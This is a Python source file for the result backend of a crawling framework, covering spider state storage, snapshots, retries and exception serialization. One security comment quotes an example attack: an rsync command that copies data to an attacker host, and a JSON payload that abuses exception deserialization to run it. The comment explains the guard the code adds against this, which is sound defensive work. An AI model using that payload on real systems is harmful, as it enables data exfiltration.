import sys
import time
import enum
from datetime import timedelta

from kombu.serialization import dumps, loads, prepare_accept_content
from kombu.serialization import registry as serializer_registry
from kombu.utils.encoding import bytes_to_str, ensure_bytes
from kombu.utils.url import maybe_sanitize_url

import tider.exceptions
from tider.exceptions import (
    raise_with_context,
    BackendReadError, BackendStoreError,
    CrawlerRevokedError, SecurityError
)
from tider.utils.serialization import (
    create_exception_cls, ensure_serializable,
    get_pickleable_exception, get_pickled_exception
)
from tider.utils.time import get_exponential_backoff_interval
from tider.utils.nodenames import nodename, nodesplit

__all__ = (
    'backend_serializer_registry', 'State',
    'Backend', 'KeyValueStoreBackend', 'DisabledBackend',
)

EXCEPTION_ABLE_CODECS = frozenset({'pickle'})

# use backend_serializer_registry.register to
# register any custom serialization method.
backend_serializer_registry = serializer_registry


class State(str, enum.Enum):
    #: Spider state is unknown (assumed pending since you know the hostname).
    PENDING = 'PENDING'
    #: Spider was started.
    STARTED = 'STARTED'
    #: Spider running
    RUNNING = 'RUNNING'
    #: Spider succeeded
    SUCCESS = 'SUCCESS'
    #: Spider failed
    FAILURE = 'FAILURE'
    #: Spider was revoked.
    REVOKED = 'REVOKED'


class Backend:
    """Base spider backend."""

    EXCEPTION_STATES = frozenset({State.FAILURE, State.REVOKED})
    READY_STATES = frozenset({State.SUCCESS, State.FAILURE, State.REVOKED})

    config_namespace = 'BACKEND'

    #: If true the backend must implement :meth:`get_many`.
    supports_native_join = False

    #: If true the backend must automatically expire spider states.
    #: The daily backend_cleanup periodic task won't be triggered
    #: in this case.
    supports_autoexpire = False

    #: Set to true if the backend is persistent by default.
    persistent = True

    retry_policy = {
        'max_retries': 20,
        'interval_start': 0,
        'interval_step': 1,
        'interval_max': 1,
    }

    def __init__(self, crawler, serializer=None, accept=None, expires=None, expires_type=None, url=None):
        self.crawler = crawler
        self.group = crawler.group
        self._store_id = nodename(f'{nodesplit(self.group)[0]}.{str(crawler.pid)}', nodesplit(self.group)[-1])
        self.spider = crawler.spider

        self.serializer = serializer or self.get_config('SERIALIZER', 'json')
        self.content_type, self.content_encoding, self.encoder = serializer_registry._encoders.get(self.serializer, (None, None, None))
        self.expires = self.prepare_expires(expires, expires_type)

        self.accept = accept or self.get_config("ACCEPT_CONTENT")
        self.accept = prepare_accept_content(self.accept)

        self.url = url

        self.always_retry = self.get_config('ALWAYS_RETRY', False)
        self.max_sleep_between_retries_ms = self.get_config('MAX_SLEEP_BETWEEN_RETRIES_MS', 10000)
        self.base_sleep_between_retries_ms = self.get_config(f'BASE_SLEEP_BETWEEN_RETRIES_MS', 10)
        self.max_retries = self.get_config(f'MAX_RETRIES', float("inf"))
        self.thread_safe = self.get_config(f'THREAD_SAFE', False)

    def get_config(self, key, default=None):
        settings = self.crawler.settings
        key = key.upper()
        return settings.get(f'{self.config_namespace}_{key}', default)

    def as_uri(self, include_password=False):
        """Return the backend as a URI, sanitizing the password or not."""
        # when using maybe_sanitize_url(), "/" is added
        # we're stripping it for consistency
        if include_password:
            return self.url
        url = maybe_sanitize_url(self.url or '')
        return url[:-1] if url.endswith(':///') else url

    def mark_as_started(self):
        """Mark spider as started."""
        return self.store_snapshot(State.STARTED, override=True)

    def mark_as_done(self, store_snapshot=True, state=State.SUCCESS):
        """Mark spider as successfully executed."""
        if not store_snapshot:
            return
        self.store_snapshot(state)

    def mark_as_failure(self, exc, traceback=None, store_snapshot=True, state=State.FAILURE):
        """Mark spider as executed with failure."""
        if not store_snapshot:
            return
        self.store_snapshot(state, exc=exc, traceback=traceback)

    def mark_as_revoked(self, reason='', store_snapshot=True, state=State.REVOKED):
        exc = CrawlerRevokedError(reason)
        if store_snapshot:
            self.store_snapshot(state, exc=exc, traceback=None)

    def prepare_exception(self, exc, serializer=None):
        """Prepare exception for serialization."""
        serializer = self.serializer if serializer is None else serializer
        if serializer in EXCEPTION_ABLE_CODECS:
            return get_pickleable_exception(exc)
        exctype = type(exc)
        return {'exc_type': getattr(exctype, '__qualname__', exctype.__name__),
                'exc_message': ensure_serializable(exc.args, self.encode),
                'exc_module': exctype.__module__}

    def exception_to_python(self, exc):
        """Convert serialized exception to Python exception."""
        if not exc:
            return None
        elif isinstance(exc, BaseException):
            if self.serializer in EXCEPTION_ABLE_CODECS:
                exc = get_pickled_exception(exc)
            return exc
        elif not isinstance(exc, dict):
            try:
                exc = dict(exc)
            except TypeError as e:
                raise TypeError(f"If the stored exception isn't an "
                                f"instance of "
                                f"BaseException, it must be a dictionary.\n"
                                f"Instead got: {exc}") from e

        exc_module = exc.get('exc_module')
        try:
            exc_type = exc['exc_type']
        except KeyError as e:
            raise ValueError("Exception information must include "
                             "the exception type") from e
        if exc_module is None:
            cls = create_exception_cls(exc_type, __name__)
        else:
            try:
                # Load module and find exception class in that
                cls = sys.modules[exc_module]
                # The type can contain qualified name with parent classes
                for name in exc_type.split('.'):
                    cls = getattr(cls, name)
            except (KeyError, AttributeError):
                cls = create_exception_cls(exc_type, tider.exceptions.__name__)
        exc_msg = exc.get('exc_message', '')

        # If the recreated exception type isn't indeed an exception,
        # this is a security issue. Without the condition below, an attacker
        # could exploit a stored command vulnerability to execute arbitrary
        # python code such as:
        # os.system("rsync /data attacker@192.168.56.100:~/data")
        # The attacker sets the task's result to a failure in the spider
        # backend with the os as the module, the system function as the
        # exception type and the payload
        # rsync /data attacker@192.168.56.100:~/data
        # as the exception arguments like so:
        # {
        #   "exc_module": "os",
        #   "exc_type": "system",
        #   "exc_message": "rsync /data attacker@192.168.56.100:~/data"
        # }
        if not isinstance(cls, type) or not issubclass(cls, BaseException):
            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'
            raise SecurityError(f"Expected an exception class, got {fake_exc_type} with payload {exc_msg}")

        # XXX: Without verifying `cls` is actually an exception class,
        #      an attacker could execute arbitrary python code.
        #      cls could be anything, even eval().
        try:
            if isinstance(exc_msg, (tuple, list)):
                exc = cls(*exc_msg)
            else:
                exc = cls(exc_msg)
        except Exception as err:  # noqa
            exc = Exception(f'{cls}({exc_msg})')

        return exc

    def encode(self, data):
        _, _, payload = self._encode(data)
        return payload

    def _encode(self, data):
        return dumps(data, serializer=self.serializer)

    def meta_from_decoded(self, meta):
        if meta['status'] in self.EXCEPTION_STATES and meta.get('traceback'):
            meta['traceback'] = self.exception_to_python(meta['traceback'])
        return meta

    def decode_meta(self, payload):
        return self.meta_from_decoded(self.decode(payload))

    def decode(self, payload):
        if payload is None:
            return payload
        payload = payload or str(payload)
        return loads(payload,
                     content_type=self.content_type,
                     content_encoding=self.content_encoding,
                     accept=self.accept)

    def prepare_value(self):
        """Prepare value for storage."""
        return self.spider.meta.copy()

    def prepare_expires(self, value, exp_type=None):
        if value is None:
            value = self.get_config('EXPIRES', 7 * 86400)
        if isinstance(value, timedelta):
            value = value.total_seconds()
        if value is not None and exp_type:
            return exp_type(value)
        return value

    def prepare_persistent(self, enabled=None):
        if enabled is not None:
            return enabled
        persistent = self.get_config('PERSISTENT')
        return self.persistent if persistent is None else persistent

    def encode_snapshot(self, state, exc=None):
        if state in self.EXCEPTION_STATES and isinstance(exc, Exception):
            return self.prepare_exception(exc)
        return self.prepare_value()

    def _gen_spider_meta(self, snapshot, state, traceback, format_date=True):
        if state in self.READY_STATES:
            date_done = self.crawler.app.now()
            if format_date:
                date_done = date_done.isoformat()
        else:
            date_done = None
        meta = {
            'group': self.crawler.group,
            'project': self.crawler.project,
            'schema': self.crawler.schema,
            'spidername': self.crawler.spidername,
            'server': self.crawler.svr,
            'status': state,
            'pid': self.crawler.pid,
            'meta': snapshot,
            'stats': self.crawler.stats.get_stats(),
            'traceback': traceback,
            'date_done': date_done,
        }
        return meta

    def _sleep(self, amount):
        self.crawler.sleep(amount)

    def store_snapshot(self, state: State = State.RUNNING, exc=None, traceback=None, override=False, **kwargs):
        """Update spider states and stats.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        if not override:
            snapshot = self.get_spider_meta().get('meta') or {}
            snapshot.setdefault('errors', [])
            snapshot_errors = []
            for error in snapshot.get('errors', []):
                error = error.copy()
                error.pop('meta', None)
                error.pop('cb_kwargs', None)
                snapshot_errors.append(error)
            snapshot.setdefault('failures', [])
            snapshot_failures = []
            for failure in snapshot.get('failures', []):
                failure = failure.copy()
                failure.pop('meta', None)
                failure.pop('cb_kwargs', None)
                snapshot_failures.append(failure)

            new = self.encode_snapshot(state, exc=exc)
            new_errors = new.pop('errors', None)
            if new_errors:
                for new_error in new_errors:
                    tmp = new_error.copy()
                    tmp.pop('meta', None)
                    tmp.pop('cb_kwargs', None)
                    if tmp not in snapshot_errors:
                        snapshot['errors'].append(new_error)
            new_failures = new.pop('failures', None)
            if new_failures:
                for new_failure in new_failures:
                    tmp = new_failure.copy()
                    tmp.pop('meta', None)
                    tmp.pop('cb_kwargs', None)
                    if tmp not in snapshot_failures:
                        snapshot['failures'].append(new_failure)
            snapshot.update(new)
        else:
            snapshot = self.encode_snapshot(state, exc=exc)
        retries = 0
        while True:
            try:
                return self._store_snapshot(snapshot, state, traceback, **kwargs)
            except Exception as exc:
                if self.always_retry and self.exception_safe_to_retry(exc):
                    if retries < self.max_retries:
                        retries += 1

                        # get_exponential_backoff_interval computes integers
                        # and time.sleep accept floats for sub second sleep
                        sleep_amount = get_exponential_backoff_interval(
                            self.base_sleep_between_retries_ms, retries,
                            self.max_sleep_between_retries_ms, True) / 1000
                        self._sleep(sleep_amount)
                    else:
                        raise_with_context(
                            BackendStoreError("Failed to store snapshot on the backend"),
                        )
                else:
                    raise

    def forget(self):
        self._forget()

    def _forget(self):
        raise NotImplementedError('backend does not implement forget.')

    def get_state(self):
        """Get the state of a spider."""
        return self.get_spider_meta()['status']

    def get_traceback(self):
        """Get the traceback for a failed spider."""
        return self.get_spider_meta().get('traceback')

    def get_stats(self):
        """Get the stats of a spider."""
        return self.get_spider_meta().get('stats')

    def exception_safe_to_retry(self, exc):
        """Check if an exception is safe to retry.

        Backends have to overload this method with correct predicates dealing with their exceptions.

        By default, no exception is safe to retry, it's up to backend implementation
        to define which exceptions are safe.
        """
        return False

    def get_spider_meta(self, spider_id=None):
        """Get spider meta from backend.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        retries = 0
        while True:
            try:
                return self._get_spider_meta(spider_id=spider_id)
            except Exception as exc:
                if self.always_retry and self.exception_safe_to_retry(exc):
                    if retries < self.max_retries:
                        retries += 1

                        # get_exponential_backoff_interval computes integers
                        # and time.sleep accept floats for sub second sleep
                        sleep_amount = get_exponential_backoff_interval(
                            self.base_sleep_between_retries_ms, retries,
                            self.max_sleep_between_retries_ms, True) / 1000
                        self._sleep(sleep_amount)
                    else:
                        raise_with_context(
                            BackendReadError("Failed to get meta"),
                        )
                else:
                    raise

    def get_group(self):
        return self._get_group()

    def delete_group(self):
        return self._delete_group()

    def cleanup(self):
        """Backend cleanup."""

    def close(self):
        """Release backend resources."""


class KeyValueStoreBackend(Backend):
    """Spider backend base class for key/value stores."""

    key_t = ensure_bytes
    spider_keyprefix = 'tider-spider-meta-'
    group_keyprefix = 'tider-crawlergroup-meta-'

    def __init__(self, *args, **kwargs):
        if hasattr(self.key_t, '__func__'):  # pragma: no cover
            self.key_t = self.key_t.__func__  # remove binding
        super().__init__(*args, **kwargs)
        self._add_global_keyprefix()
        self._encode_prefixes()

    def _add_global_keyprefix(self):
        """
        This method prepends the global keyprefix to the existing keyprefixes.

        This method checks if a global keyprefix is configured in `BACKEND_TRANSPORT_OPTIONS` using the
        `global_keyprefix` key. If so, then it is prepended to the task and group key prefixes.
        """
        global_keyprefix = self.get_config('TRANSPORT_OPTIONS', {}).get("global_keyprefix", None)
        if global_keyprefix:
            if global_keyprefix[-1] not in ':_-.':
                global_keyprefix += '_'
            self.spider_keyprefix = f"{global_keyprefix}{self.spider_keyprefix}"
            self.group_keyprefix = f"{global_keyprefix}{self.group_keyprefix}"

    def _encode_prefixes(self):
        self.spider_keyprefix = self.key_t(self.spider_keyprefix)
        self.group_keyprefix = self.key_t(self.group_keyprefix)

    def get(self, key):
        raise NotImplementedError('Must implement the get method.')

    def mget(self, keys):
        raise NotImplementedError('Does not support get_many')

    def sadd(self, key, values):
        raise NotImplementedError('Does not support sadd')

    def sget(self, key, **kwargs):
        raise NotImplementedError('Does not support sget')

    def srem(self, key, values):
        raise NotImplementedError('Does not support srem')

    def set(self, key, value):
        raise NotImplementedError('Must implement the set method.')

    def delete(self, key):
        raise NotImplementedError('Must implement the delete method')

    def scan(self, pattern):
        raise NotImplementedError('Does not support get_many')

    def incr(self, key):
        raise NotImplementedError('Does not implement incr')

    def expire(self, key, value):
        pass

    def _get_spider_meta(self, spider_id=None):
        """Get spider meta-data."""
        meta = self.get(self.get_spider_key(spider_id=spider_id))
        if not meta:
            return {'status': State.PENDING, 'meta': None}
        return self.decode_meta(meta)

    def get_spider_key(self, spider_id=None):
        """Get the cache key for spider."""
        spider_id = spider_id or self._store_id
        key_t = self.key_t
        return key_t('').join([
            self.spider_keyprefix, key_t(spider_id)
        ])

    def get_group_key(self):
        """Get the cache key for group."""
        key_t = self.key_t
        return key_t('').join([
            self.group_keyprefix, key_t(self.crawler.group)
        ])

    def _strip_prefix(self, key):
        """Take bytes: emit string."""
        key = self.key_t(key)
        prefix = self.spider_keyprefix
        if key.startswith(prefix):
            return bytes_to_str(key[len(prefix):])
        return bytes_to_str(key)

    def _filter_states(self, values, states=None):
        states = states or []
        for k, value in values:
            if value is not None:
                value = self.decode_meta(value)
                if value['status'] in states:
                    yield k, value

    def _mget_to_results(self, values, keys, states=None):
        if hasattr(values, 'items'):
            # client returns dict so mapping preserved.
            return {
                self._strip_prefix(k): v
                for k, v in self._filter_states(values.items(), states)
            }
        else:
            # client returns list so need to recreate mapping.
            return {
                bytes_to_str(self._strip_prefix(keys[i])): v
                for i, v in self._filter_states(enumerate(values), states)
            }

    def get_many(self, timeout=None, interval=0.5, on_message=None, on_interval=None,
                 max_iterations=None, states=None):
        states = states if states is not None else self.READY_STATES
        interval = 0.5 if interval is None else interval
        iterations = 0
        names = set([each for each in self.scan(pattern=f'{self.crawler.group}*')])
        while names:
            keys = list(names)
            r = self._mget_to_results(self.mget(keys), keys, states)
            names.difference_update({bytes_to_str(v) for v in r})
            for key, value in r.items():
                if on_message is not None:
                    on_message(value)
                yield bytes_to_str(key), value
            if timeout and iterations * interval >= timeout:
                raise TimeoutError(f'Operation timed out ({timeout})')
            if on_interval:
                on_interval()
            time.sleep(interval)  # don't busy loop.
            iterations += 1
            if max_iterations and iterations >= max_iterations:
                break

    def _forget(self):
        self.delete(self.get_spider_key())

    def _store_snapshot(self, snapshot, state, traceback=None, **kwargs):
        meta = self._gen_spider_meta(snapshot=snapshot, state=state, traceback=traceback)
        try:
            self.sadd(self.get_group_key(), self.get_spider_key())
            self.set(self.get_spider_key(), self.encode(meta))
        except BackendStoreError as e:
            raise BackendStoreError(str(e), state=state, spider_id=self._store_id) from e

    def _delete_group(self):
        for key in self.scan(pattern=f'{self.crawler.group}*'):
            self.delete(key)
        self.delete(self.get_group_key())

    def _get_group(self):
        result = {k: v for k, v in self.get_many()}
        return result


class DisabledBackend(Backend):
    """Dummy spider backend."""

    def store_snapshot(self, *args, **kwargs):
        pass

    def forget(self, group=False):
        pass

    def _is_disabled(self, *args, **kwargs):
        pass

    def as_uri(self, *args, **kwargs):
        return 'disabled://'

    get_state = get_stats = get_spider_meta = get_traceback = _is_disabled
    _get_spider_meta = _get_group = _is_disabled
